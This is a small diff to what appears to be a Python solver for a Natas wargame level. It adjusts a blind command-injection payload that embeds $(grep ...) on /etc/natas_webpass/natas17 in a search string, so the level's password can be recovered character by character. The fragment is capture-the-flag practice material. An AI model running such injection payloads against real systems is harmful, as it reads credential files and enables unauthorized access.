@@ -27,7 +27,7 @@ while idx < 32:
     else:
         # alpha char matched, but case not known yet
         match = match[0]
-        caseMatch = getMatch("^$(grep -o ^"+('.'*(idx-1))+"[a-z] /etc/natas_webpass/natas17)$(echo blizzard)$")
+        caseMatch = getMatch("^$(grep ^"+('.'*(idx-1))+"[a-z] /etc/natas_webpass/natas17)blizzard$")
         print(f"case match {caseMatch}")
         match = match.upper() if caseMatch == 'blizzard' else match.lower()
     pw += match
